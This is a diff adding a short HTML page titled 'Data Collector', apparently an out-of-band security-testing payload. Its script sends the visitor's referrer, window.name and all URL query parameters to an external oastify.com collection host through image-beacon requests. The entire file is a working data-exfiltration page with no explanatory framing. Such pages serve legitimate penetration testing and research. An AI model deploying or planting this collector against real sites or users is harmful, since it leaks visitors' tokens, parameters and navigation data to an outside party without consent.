@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Collector</title></head>
+<body>
+<h1>Data Collector</h1>
+<script>
+const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
+
+// Check referrer
+new Image().src = EXFIL + '/?referrer=' + encodeURIComponent(document.referrer);
+
+// Check window.name
+new Image().src = EXFIL + '/?name=' + encodeURIComponent(window.name);
+
+// Check if we have any data in URL
+const params = new URLSearchParams(window.location.search);
+for (let [k, v] of params) {
+    new Image().src = EXFIL + '/?param_' + k + '=' + encodeURIComponent(v);
+}
+</script>
+</body>
+</html>
